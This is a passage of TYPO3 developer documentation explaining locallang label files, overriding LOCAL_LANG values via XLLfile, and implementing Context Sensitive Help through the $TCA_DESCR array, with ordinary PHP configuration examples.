not matter as long as one of the files exist. TYPO3 will look for
both file extensions and use the one it finds.</P>
<P CLASS="western">If <I>not</I> a &quot;LLL:&quot; string is
prefixed then the input is exploded by a vertical bar (|) and each
part is perceived as the label for the corresponding language in the
TYPO3_languages constant. However this concept is <B>depricated</B>
since it's impossible to maintain efficiently. <I>Always</I> use the
&quot;LLL:&quot; references to proper locallang files. (See
discussion of &quot;language-splitted&quot; syntax above).</P>
<P CLASS="western">$LANG-&gt;sL() requires no manual inclusion of a
locallang file since that is done automatically. Typically used in
table and field name labels in $TCA or in modules where a single
value from the core locallang file is needed.</P>
<P CLASS="western">(See the example in the previous section
'&quot;language-splitted&quot; syntax' in addition)</P>
<H4 CLASS="western">Including locallang files in modules</H4>
<P CLASS="western">If you are using $LANG-&gt;getLL() for fetching
labels in your modules (this is recommended) then you must make sure
to include the locallang file with the labels during the
initialization of your module. However you should not just include
the file - rather use the API-function $LANG-&gt;includeLLFile()
designed for that. There are three reasons for this:</P>
<UL>
	<LI><P CLASS="western">If the locallang.php file is splitted into a
	main- and sub-file that is automatically handled by that function.</P>
	<LI><P CLASS="western">If any 'XLLFile' is configured to override
	the values in the default locallang file, that file will be included
	and the values merged onto the default array.</P>
	<LI><P CLASS="western">The file-reference is a &quot;locallang&quot;-file
	in either PHP or XML format. It is not important to know in this
	case! Using the &quot;.php&quot; or &quot;.xml&quot; file ending
	will not matter as long as the file exists. TYPO3 will look for both
	file extensions and use the one it finds.</P>
</UL>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">Example from the &quot;setup&quot; module (red
line includes locallang for that module):</P>
<PRE CLASS="western">require ($BACK_PATH.'init.php');
require ($BACK_PATH.'template.php');
<FONT COLOR="#ff0000">$LANG-&gt;includeLLFile('EXT:setup/mod/locallang.php');</FONT></PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">This function call will load the $LOCAL_LANG array
from 'EXT:setup/mod/locallang.php' into the global memory space and
thus make it available to $LANG-&gt;getLL(). If
'EXT:setup/mod/locallang.php' does not exist but
'EXT:setup/mod/locallang.xml' does, then the latter is parsed, loaded
and everything is the same for TYPO3. Although you should probably
use the correct file extension in the file reference (using &quot;.xml&quot;
when the locallang file is actually a &quot;locallang-XML&quot;
format file).</P>
<P CLASS="western">If you wish to not load the $LOCAL_LANG array into
global space, but rather have it returned in a variable, just set the
second optional argument true like this:</P>
<P CLASS="western">$myLocalLang =
$LANG-&gt;includeLLFile('EXT:setup/mod/locallang.xml', 1);</P>
<H3 CLASS="western"><A NAME="2.8.12.Overriding LOCAL_LANG values|outline"></A>
Overriding LOCAL_LANG values</H3>
<P CLASS="western">TYPO3 offers an API for overriding LOCAL_LANG
values in the backend by custom files you set up. Provided that the
inclusion of the locallang file is handled by the language class then
your custom file will be included after the real locallang file(s)
and the arrays merged together. Lets look at an example:</P>
<H5 CLASS="western">Example</H5>
<P CLASS="western">We want to change the label of the logout button
from &quot;Logout&quot; to &quot;End session&quot;. What we do is
this:</P>
<UL>
	<LI><P CLASS="western">First, find out where the label is outputted
	so you can know the label key and locallang file. <BR>In this case
	the script &quot;alt_menu.php&quot; outputs the button which is
	generated by a function from the file
	&quot;class.alt_menu_functions.inc&quot;. Looking into this file we
	find that the line
	&quot;$LANG-&gt;sL('LLL:EXT:lang/locallang_core.php:buttons.logout')&quot;
	fetches the label for the button.</P>
	<LI><P CLASS="western">Create an alternative $LOCAL_LANG array with
	the labelkeys you want to override. <BR>I have created the file
	&quot;typo3conf/llor_test.php&quot; which looks like this:</P>
	<PRE CLASS="western">&lt;?php
$LOCAL_LANG = array(
	&quot;default&quot; =&gt; array(
		&quot;buttons.logout&quot; =&gt; &quot;End session&quot;,
	),
	&quot;dk&quot; =&gt; array(
		&quot;buttons.logout&quot; =&gt; &quot;Afslut admin&quot;,
	)
);
?&gt;</PRE><P CLASS="western">
	</P>
	<P CLASS="western">Notice how it contains both an English and Danish
	alternative.</P>
	<LI><P CLASS="western">Configure the script to override values in
	the file &quot;EXT:lang/locallang_core.php&quot;<BR>This is simply
	done by adding an entry in the $TYPO3_CONF_VARS['BE']['XLLfile']
	array which points to the overriding file:</P>
	<PRE CLASS="western">$TYPO3_CONF_VARS['BE']['XLLfile']['EXT:lang/locallang_core.php']='typo3conf/llor_test.php';</PRE><P CLASS="western">
	</P>
	<P CLASS="western">The filepath of &quot;typo3conf/llor_test.php&quot;
	is relative to the PATH_site constant. You could also keep the file
	in an extension in which case you would have to enter the file
	reference like 'EXT:myext/llor_test.php' - and the file will
	automatically be located wherever you extension is installed.</P>
</UL>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">This example includes a function call to
$LANG-&gt;sL(). If the labels are fetched by $LANG-&gt;getLL() as
they are in most modules you will have to make sure that the
locallang file you need to override was included by the function
$LANG-&gt;includeLLFile() since that will detect any &quot;XLLfile&quot;
you might have configured - otherwise the API will not work of
course.</P>
<H2 CLASS="western"><A NAME="2.9.Context Sensitive Help (CSH)|outline"></A>
Context Sensitive Help (CSH)</H2>
<P CLASS="western">TYPO3 offers a full API for adding Context
Sensitive Help to especially all database tables and fields. This is
normally expressed by small comments and an icon linking to a window
with a full explanation of a field - or a feature in a module if you
choose to use it in that way.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m180e03da.png" NAME="Graphic36" ALIGN=LEFT WIDTH=485 HEIGHT=412 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">In the example above the context sensitive help
appears when &quot;Show field descriptions&quot; is enabled.</P>
<H4 CLASS="western">Basic facts about Context Sensitive Help</H4>
<P CLASS="western">These are some basic facts about how CSH works:</P>
<UL>
	<LI><P CLASS="western">Context Sensitive Help (CSH) labels are
	stored in locallang files inside of extensions, typically in a main
	file with English and sub-files with the individual languages.</P>
	<LI><P CLASS="western">The CSH locallang files are typically named
	'locallang_csh_*.php' or &quot;locallang_csh_*.xml&quot;</P>
	<LI><P CLASS="western">They are translated as any other locallang
	file on typo3.org (for &quot;php&quot; versions) or by the backend
	module in the extension &quot;llxmltranslate&quot; (for the
	recommended &quot;xml&quot; version)!</P>
	<LI><P CLASS="western">CSH labels can override or add themselves to
	existing values thus allowing for local, customized help. Very
	flexible.</P>
</UL>
<H3 CLASS="western"><A NAME="2.9.1.The $TCA_DESCR array|outline"></A>The
$TCA_DESCR array</H3>
<P CLASS="western">The global array $TCA_DESCR is reserved to contain
CSH labels. CSH labels are loaded as they are needed. Thus the class
rendering the form will make an API call to the $LANG object to have
the CSH labels loaded - if any - for the table &quot;pages&quot;.</P>
<P CLASS="western">In this process the $TCA_DESCR array will look
like this before the API call:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_5793df2e.png" NAME="Graphic37" ALIGN=LEFT WIDTH=339 HEIGHT=133 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Notice that the key [&quot;pages&quot;][&quot;refs&quot;]
has a file reference pointing to a locallang file which contains the
labels we need. Nothing more. These default values found in
$TCA_DESCR is set by API calls in t3lib/stddb/tables.php:</P>
<PRE CLASS="western">/**
 * Setting up TCA_DESCR - Context Sensitive Help
 */
<FONT COLOR="#ff0000">t3lib_extMgm::addLLrefForTCAdescr('pages','EXT:lang/locallang_csh_pages.php');</FONT>
t3lib_extMgm::addLLrefForTCAdescr('be_users','EXT:lang/locallang_csh_be_users.php');
t3lib_extMgm::addLLrefForTCAdescr('be_groups','EXT:lang/locallang_csh_be_groups.php');
t3lib_extMgm::addLLrefForTCAdescr('sys_filemounts','EXT:lang/locallang_csh_sysfilem.php');
t3lib_extMgm::addLLrefForTCAdescr('_MOD_tools_em','EXT:lang/locallang_csh_em.php');		</PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">The red line above is the line setting the file
for the &quot;pages&quot; table. Notice that other extensions might
supply additional files and add additional files to be includes after
the defaults ones above! In that case those will override/add to the
existing values. The extension &quot;context_help&quot; is doing just
that - it includes a whole bunch of locallang files with description
of basically the whole &quot;cms&quot; extension.</P>
<P CLASS="western">Well, inside of the class t3lib_TCEforms an API
call is made to load the actual labels for the pages table:</P>
<PRE CLASS="western">			if ($this-&gt;edit_showFieldHelp || $this-&gt;doLoadTableDescr($table))	{
				<FONT COLOR="#ff0000">$GLOBALS['LANG']-&gt;loadSingleTableDescription($table);</FONT>
			}</PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">So labels for $table is loaded - and if table is
&quot;pages&quot; then this will be the result back in $TCA_DESCR:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">As you can see labels are loaded from the file
sysext/lang/locallang_csh_pages.php. The content of this file looks
like this (partly):</P>
<PRE CLASS="western"><CODE CLASS="western"><FONT COLOR="#0000bb">&lt;?php<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">/**<BR>* Default&nbsp;&nbsp;TCA_DESCR for &quot;pages&quot;<BR>*/<BR><BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$LOCAL_LANG&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&nbsp;Array&nbsp;(<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'default'&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt;&nbsp;Array&nbsp;(<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'title.description'&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Enter the title of the page or folder.'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'title.syntax'&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'You must enter a page title. The field is required.'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'doktype.description'&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Select the page type. This affects . . . ses.'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'doktype.details'&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'The \'Standard\' type represents a . . . any problems).'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'TSconfig.description'&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Page TypoScript configuration.'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'TSconfig.details'&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Basically \'TypoScript\' is a . . . alled).<BR>'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'TSconfig.syntax'&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Basic TypoScr. . . \'Conditions\' and \'Constants\'.'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;)<BR>);<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">?&gt;</FONT></CODE></PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">Notice how the actual labels in the locallang file
contains periods (.) which defines [fieldname].[type-key].[special
options]</P>
<UL>
	<LI><P CLASS="western"><B>Fieldname</B> is the field from the table
	in question</P>
	<LI><P CLASS="western"><B>Type-key</B> is one of these values:</P>
	<UL>
		<LI><P CLASS="western"><B>description</B> : A short description of
		the field (as shown in the editing form)</P>
		<LI><P CLASS="western"><B>details</B> : A more lengthy description
		adding some details. Only visible in the external popup window.</P>
		<LI><P CLASS="western"><B>syntax</B> : A description of the syntax
		of the content in the field in question. Use this if the field must
		have some special code format entered.</P>
		<LI><P CLASS="western"><B>image</B> : A reference to an image</P>
		<LI><P CLASS="western"><B>image_descr</B> : Description for the
		image</P>
		<LI><P CLASS="western"><B>seeAlso</B> : References to other
		relevant CSH entries.</P>
		<LI><P CLASS="western"><B>alttitle</B> : Alternative title for
		field/table</P>
	</UL>
	<LI><P CLASS="western"><B>special options</B> : Here you can add for
	example a plus-sign '+'. Means the value of the label is not
	substituting any existing value but rather adding to it (separated
	with a single line break). This makes sense only if you are
	supplying overriding values for existing previously loaded values.</P>
</UL>
<P CLASS="western"><B>Notice:</B></P>
<P CLASS="western" STYLE="font-weight: normal">A field key can be
prefixed with &quot;_&quot; which will prevent it from being shown in
the translation tools. This is useful for &quot;seeAlso&quot; and
&quot;image&quot; since they should not be translated to other
languages!</P>
<H4 CLASS="western">HTML in CSH</H4>
<P CLASS="western">Currently &quot;description&quot;, &quot;details&quot;
and &quot;syntax&quot; fields accept limited XHTML content: &lt;strong&gt;,
&lt;em&gt;, &lt;b&gt;, &lt;i&gt;. However, don't use important markup
for the “description” field since it will stripped when shown in
TCEforms.</P>
<H5 CLASS="western">Example</H5>
<P CLASS="western">Looking at the &quot;context_help&quot; extension
you will see many &quot;locallang_csh_*.php&quot; files. One is named
&quot;locallang_csh_pages.php&quot; and the first lines from that
looks like this:</P>
<PRE CLASS="western">&lt;?php
/**
* Default  TCA_DESCR for &quot;pages&quot;
*/

$LOCAL_LANG = Array (
	'default' =&gt; Array (
		'title.description<FONT COLOR="#ff0000">.+</FONT>' =&gt; 'This is normally shown in the website navigation.',
		'layout.description' =&gt; 'Select a layout for the page. Any effect depends on the website template.',</PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">Notice the red plus-sign in the
&quot;title.description&quot; label - this value is <I>added</I> to
the existing title.</P>
<P CLASS="western">The other key, &quot;layout.description&quot;, is
an addition which did not previously exist in the $TCA_DESCR for the
pages-table - but that makes sense here since the &quot;context_help&quot;
depends on the &quot;cms&quot; extension being loaded which would
have added the field &quot;layout&quot; to the database on
beforehand! (the &quot;layout&quot; field in the pages-table is not a
part of the core as you might have guessed by now...)</P>
<H4 CLASS="western">Keys in $TCA_DESCR</H4>
<P CLASS="western">The keys in $TCA_DESCR is by default pointing to
database tables, for example &quot;pages&quot;. However if you wish
to use CSH in your modules you can use keys name by this syntax:</P>
<PRE CLASS="western">	_MOD_[<I>module_name</I>] - Placed in the “Backend module” category
	xMOD_[extension key with tx_ infront] - Placed in the “Other” category
	xEXT_[<I>extension key</I>] - for description of extensions.
	xGLOSSARY_[group] - for glossaries, will be marked up in other CSH.</PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">Normally modules will have their name in the
$MCONF variable. That would allow you to load the available labels
for your module by this API call:</P>
<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">$key </FONT><FONT COLOR="#007700">= </FONT><FONT COLOR="#dd0000">'_MOD_'</FONT><FONT COLOR="#007700">.</FONT><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'name'</FONT><FONT COLOR="#007700">];</FONT></FONT>
<FONT COLOR="#0000bb">$LANG</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">loadSingleTableDescription</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#0000bb">$key</FONT><FONT COLOR="#007700">);</FONT></PRE><P CLASS="western">
... and you would now have your labels loaded in
$TCA_DESCR[$key]['columns'].</P>
<P CLASS="western"><B>Notice:</B> You will still have to set up the
locallang file with the CSH labels by a API call to
t3lib_extMgm::addLLrefForTCAdescr(), possibly in a &quot;ext_tables.php&quot;
file.</P>
<H3 CLASS="western"><A NAME="2.9.2.The locallang files for CSH|outline"></A>
The locallang files for CSH</H3>
<P CLASS="western">First of all you are strongly encouraged to use
the locallang file structure where the default document sets &quot;EXT&quot;
as value for the localized labels so that sub-files are included.
This will load the system less and make it all easier to manage.</P>
<P CLASS="western">Then there are a few other rules to follow:</P>
<UL>
	<LI><P CLASS="western">Prefix the locallang files &quot;locallang_csh_&quot;
	so that translators can easily spot these files (which has a
	secondary priority compared with other locallang files!).</P>
	<LI><P CLASS="western">Observe the filename length, which should be
	maximum 31 chars in total! Since the prefix &quot;locallang_csh_&quot;
	takes 14 chars, the extension &quot;.php&quot; takes four and any
	&quot;subfile-suffix&quot; (fx. &quot;.dk&quot;) would take three,
	there is 31-14-4-3 = 10 chars left. So lets say you have 9
	characters to name the file to be safe.</P>
	<P CLASS="western" STYLE="font-weight: normal">Examples where
	&quot;pages&quot; (5 chars) is the unique name:</P>
	<PRE CLASS="western">locallang_csh_pages.php	=&gt;	23 chars
locallang_csh_pages.dk.php	=&gt;	26 chars</PRE><P CLASS="western">
	</P>
	<LI><P CLASS="western">Observe the label-key naming by the syntax
	[fieldname].[type-key].[special option] (see previous section)</P>
	<LI><P CLASS="western">Label-key names that are prefixed &quot;_&quot;
	can safely be used - the prefix is simply removed! This is
	encouraged for the &quot;seeAlso&quot; and &quot;image&quot; field
	names since those are in common for all languages and therefore
	doesn't need translation (the typo3.org translation tool ignores
	label-keys which are prefixed &quot;_&quot;).</P>
	<LI><P CLASS="western">When used with database tables: Blank
	fieldnames are used for information about the database table itself
	- non-blank fieldnames are expected to point to the actual
	fieldnames.</P>
	<LI><P CLASS="western">For the locallang-XML files which are
	translated by a backend module you can place images in a subfolder,
	&quot;cshimages/&quot;, to where the locallang-file is located and
	they will be shown in a selector box inside the translation tool.</P>
</UL>
<H4 CLASS="western">Syntax for the type-keys content</H4>
<TABLE WIDTH=100% BORDER=1 BORDERCOLOR="#000000" CELLPADDING=4 CELLSPACING=0>
	<COL WIDTH=45*>
	<COL WIDTH=211*>
	<THEAD>
		<TR VALIGN=TOP>
			<TH WIDTH=18%>
				<P CLASS="western">type-key</P>
			</TH>
			<TH WIDTH=82%>
				<P CLASS="western">Syntax</P>
			</TH>
		</TR>
	</THEAD>
	<TBODY>
		<TR VALIGN=TOP>
			<TD WIDTH=18%>
				<P CLASS="western">description</P>
			</TD>
			<TD WIDTH=82%>
				<P CLASS="western">Text / XHTML. Mandatory.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=18%>
				<P CLASS="western">details 
				</P>
			</TD>
			<TD WIDTH=82%>
				<P CLASS="western">Text / XHTML. Optional.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=18%>
				<P CLASS="western">syntax 
				</P>
			</TD>
			<TD WIDTH=82%>
				<P CLASS="western">Text / XHTML. Optional.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=18%>
				<P CLASS="western">image_descr 
				</P>
			</TD>
			<TD WIDTH=82%>
				<P CLASS="western">Text. Optional.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=18%>
				<P CLASS="western">image</P>
			</TD>
			<TD WIDTH=82%>
				<P CLASS="western">Reference to an image (gif,png,jpg) which will
				be shown below the syntax field (before seeAlso)</P>
				<P CLASS="western">The reference must be 
				</P>
				<UL>
					<LI><P CLASS="western">a) either relative to the TYPO3_mainDir
					(fx. &quot;gfx/i/pages.gif&quot;) or 
					</P>
					<LI><P CLASS="western">b) related to an extension (fx.
					&quot;EXT:context_help/descr_imgs/hidden_page.gif&quot;)</P>
				</UL>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western">You can supply a comma list of image
				references in order to show more than one image. The image_descr
				value will be splitted per linebreak and shown under each image.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=18%>
				<P CLASS="western">seeAlso</P>
			</TD>
			<TD WIDTH=82%>
				<P CLASS="western">Internal hyperlink system for related
				elements. References to other TCA_DESCR elements or URLs.</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western"><B>Syntax:</B></P>
				<UL>
					<LI><P CLASS="western">Separate references by comma (,) or line
					breaks.</P>
					<LI><P CLASS="western">A reference can be:</P>
					<UL>
						<LI><P CLASS="western">either  a URL (identified by the 'second
						part' being prefixed &quot;http&quot;, see below)</P>
						<LI><P CLASS="western">or a [table]:[field] pair</P>
					</UL>
					<LI><P CLASS="western">If the reference is an external URL, then
					the reference is splitted by vertical line (|) and the first
					part is the link label, while the second part is the &quot;http&quot;-URL</P>
					<LI><P CLASS="western">If the reference is to another internal
					TCA_DESCR element, then the reference is splitted by colon (:)
					and the first part is the <I>table</I> while the second is the
					<I>field</I>.</P>
				</UL>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western">External URLs will open in a blank window. The
				links will be in italics.</P>
				<P CLASS="western">Internal references will open in the same
				window 
				</P>
				<P CLASS="western">For internal references the permission for
				table/field read access will be checked and if it fails, the
				reference will not be shown.</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western"><B>Example:</B></P>
				<P CLASS="western">pages:starttime , pages:endtime ,
				tt_content:header , Link to TYPO3.org | http://typo3.org/</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=18%>
				<P CLASS="western">alttitle</P>
			</TD>
			<TD WIDTH=82%>
				<P CLASS="western">Alternative title shown in CSH pop-up window.</P>
				<P CLASS="western">For database tables and fields the title from
				TCA is fetched by default, however overridden by this value if it
				is not blank. 
				</P>
				<P CLASS="western">For modules (tablename prefixed &quot;_MOD_&quot;)
				you must specify this value, otherwise you will see the bare key
				outputted.</P>
			</TD>
		</TR>
	</TBODY>
</TABLE>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">In all cases of &quot;Text&quot; above &lt;strong&gt;,
&lt;em&gt;, &lt;b&gt;, and &lt;i&gt; is allowed as HTML tags. <I>Make
HTML-tag names and attributes in lowercase! Must be XHTML compliant.</I></P>
<H3 CLASS="western"><A NAME="2.9.3.The CSH pop-up window|outline"></A>
The CSH pop-up window</H3>
<P CLASS="western">Apart from $TCA_DESCR labels (for example
&quot;description&quot;) shown directly in the context of a form or a
module you can always click the little &quot;?&quot; icon:</P>
<P CLASS="western"><IMG SRC="10_html_af9fc91.png" NAME="Graphic39" ALIGN=LEFT WIDTH=397 HEIGHT=346 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">This window will show you all details including
possible links to related descriptions and external URLs.</P>
<P CLASS="western">In this window you can also click a link to see
the full description of the whole table/module from which this single
field stems:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<H3 CLASS="western"><A NAME="2.9.4.Implementing CSH for your own tables/fields|outline"></A>
Implementing CSH for your own tables/fields</H3>
<P CLASS="western">Implementing CSH for tables and fields of a table
is very easy. The display of description, help icon etc. is
automatically done by the form rendering class as long as you do the
configuration properly. Lets look at two examples:</P>
<H4 CLASS="western">Adding CSH for fields added to existing tables</H4>
<P CLASS="western">Say you have created an extension named &quot;myext&quot;
and you have extended the pages-table with a new field,
&quot;tx_myext_test&quot;. What you need to do is to:</P>
<UL>
	<LI><P CLASS="western">Create a file named something like
	&quot;locallang_csh_pages.php&quot; in your extension directory.
	Then enter PHP-code along these lines:</P>
	<PRE CLASS="western"><CODE CLASS="western"><FONT COLOR="#0000bb">&lt;?php<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">/**<BR>* Default&nbsp;&nbsp;TCA_DESCR for my new field in the &quot;pages&quot; table<BR>*/<BR><BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$LOCAL_LANG&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&nbsp;Array&nbsp;(<BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'default'&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt;&nbsp;Array&nbsp;(<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'tx_myext_test.description'&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'Enter some test content'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'tx_myext_test.details'&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&gt;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'You can enter any content you like in this field'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">,<BR>&nbsp;&nbsp;&nbsp;&nbsp;)<BR>);<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">?&gt;</FONT></CODE>
</PRE>
</UL>
<UL>
	<LI><P CLASS="western">Then add this line to the ext_tables.php file
	of your extension:</P>
	<PRE CLASS="western">t3lib_extMgm::addLLrefForTCAdescr('pages','EXT:myext/locallang_csh_pages.php');</PRE>
</UL>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">That's it.</P>
<H3 CLASS="western"><A NAME="2.9.5.Implementing CSH in your modules|outline"></A>
Implementing CSH in your modules</H3>
<P CLASS="western">Implementing CSH in your own modules is a little
more difficult. In addition to the two mandatory steps of a) creating
a locallang_csh_*.php file in your extension directory and b) calling
the t3lib_extMgm::addLLrefForTCAdescr() API function in the
ext_tables.php file you might also have to manually <I>load</I> the
labels and manually <I>insert </I>the labels where you want them to
appear. Whether you need this step or not depends on your method of
application:</P>
<H4 CLASS="western">Method 1: Using t3lib_BEfunc::helpText*()
functions</H4>
<P CLASS="western">If you use these functions the descriptions are
not loaded automatically for you. You have to do that manually in the
initialization of your module:</P>
<OL>
	<LI><P CLASS="western">First, load the description labels for the
	module. You do that best in the init() function of your script
	class:</P>
	<PRE CLASS="western">			// Descriptions:
		$this-&gt;descrTable = &quot;_MOD_&quot;.$this-&gt;MCONF[&quot;name&quot;];
		<FONT COLOR="#ff0000">if ($BE_USER-&gt;uc[&quot;edit_showFieldHelp&quot;])	{</FONT>
			$LANG-&gt;loadSingleTableDescription($this-&gt;descrTable);
		<FONT COLOR="#ff0000">}</FONT></PRE><P CLASS="western">
	</P>
	<P CLASS="western">It's assumed that $this-&gt;MCONF equals the
	global $MCONF var that contain module configuration - this delivers
	the unique module name.</P>
	<P CLASS="western">Then secondly - <I>but most important</I> - is
	that you check for the User Configuration setting
	&quot;edit_showFieldHelp&quot; (highlighted with red)</P>
	<LI><P CLASS="western">Then for each position in your document where
	you want to have a help icon and possibly help-text (description
	field) you will have to call an API function;
	t3lib_BEfunc::helpTextIcon(), t3lib_BEfunc::helpText() or both.
	These will check if help is available and if so, return a help icon
	/ help text.</P>
</OL>
<P CLASS="western">This approach is user in the Extension Manager for
example. Here it is a good choice because there are descriptions for
all settings for extensions and we want to link them to the help
icons in a table column</P>
<H5 CLASS="western">Example 1</H5>
<P CLASS="western">The most simple and straight forward way to
include the icon/helptext would be something like this:</P>
<PRE CLASS="western">$HTMLcode.=
	t3lib_BEfunc::helpTextIcon($this-&gt;descrTable,&quot;quickEdit_selElement&quot;,$GLOBALS[&quot;BACK_PATH&quot;]).
	t3lib_BEfunc::helpText($this-&gt;descrTable,&quot;quickEdit_selElement&quot;,$GLOBALS[&quot;BACK_PATH&quot;]).
	&quot;&lt;br/&gt;&quot;;
</PRE><P CLASS="western">
These lines assumes that 
</P>
<UL>
	<LI><P CLASS="western">$this-&gt;descrTable points to the
	&quot;tablename&quot; (in this case the string
	&quot;_MOD_&quot;.$MCONF[&quot;name&quot;])</P>
	<LI><P CLASS="western">&quot;quickEdit_selElement&quot; is a
	&quot;fieldname&quot; defined in the locallang_csh file</P>
	<LI><P CLASS="western">$GLOBALS[&quot;BACK_PATH&quot;] is correctly
	pointing back to the TYPO3_mainDir (that is necessary for modules
	outside of the main directory)</P>
</UL>
<P CLASS="western">The locallang_csh file for this example would look
like this:</P>
